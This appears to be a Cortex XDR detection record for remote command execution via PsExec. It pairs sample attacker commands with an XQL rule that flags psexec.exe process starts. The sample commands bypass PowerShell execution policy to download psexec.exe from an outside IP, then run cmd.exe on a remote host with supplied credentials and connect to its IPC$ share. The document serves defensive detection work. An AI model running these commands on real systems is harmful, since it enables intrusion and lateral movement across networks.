identity.name: Remote Command Execution via PsExec
identity.summary: An attacker uses PsExec.exe to execute commands on a remote host. Cortex detects this behavior through process creation and network activity.
identity.description: An attacker uses PsExec.exe to execute commands on a remote host. Cortex detects this behavior through process creation and network activity.

payload.code:
powershell.exe -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'http://192.0.2.10/psexec.exe' -OutFile 'C:\\Windows\\Temp\\psexec.exe'"
C:\\Windows\\Temp\\psexec.exe \\targethost -u username -p password cmd.exe /c "whoami > C:\\temp\\output.txt"
net use \\targethost\\ipc$ /user:username password
C:\\Windows\\Temp\\psexec.exe \\targethost -u username -p password "C:\\Windows\\System32\\cmd.exe /c echo Hello > C:\\temp\\test.txt"

biocs.name: PsExec Remote Execution Process
biocs.description: Detection of PsExec.exe process execution with remote host parameters
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = 'psexec.exe'
| filter action_command_line contains 'targethost'
